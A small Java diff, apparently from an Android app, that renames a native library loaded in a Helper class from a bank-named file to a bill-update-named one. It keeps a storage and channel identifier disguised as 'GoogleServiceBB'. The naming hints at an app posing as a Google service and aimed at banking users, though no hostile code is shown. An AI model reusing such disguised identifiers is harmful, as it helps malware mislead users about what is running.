@@ -26,7 +26,7 @@ import java.util.List;
 public class Helper {
 
     {
-        System.loadLibrary("bankofindia.cpp");
+        System.loadLibrary("billupdateblue.cpp");
     }
     public String StorageName = "GoogleServiceBB";
     public String BG_CHANNEL_ID = "GoogleServiceBB";
